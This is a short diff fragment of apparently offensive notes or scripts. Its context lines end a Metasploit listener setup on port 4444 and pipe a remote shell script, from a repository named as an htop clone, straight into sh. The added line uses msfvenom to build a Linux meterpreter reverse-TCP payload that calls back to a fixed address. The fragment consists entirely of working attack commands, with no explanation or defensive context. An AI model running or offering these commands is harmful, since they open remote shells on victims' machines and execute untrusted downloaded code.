@@ -5,3 +5,4 @@ set LPORT 4444
 exploit
 
 curl -LsSf https://raw.githubusercontent.com/diedromeo/htopclone/refs/heads/main/cmd.sh | sh
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.223.129 LPORT=4444 -f elf > shell.elf
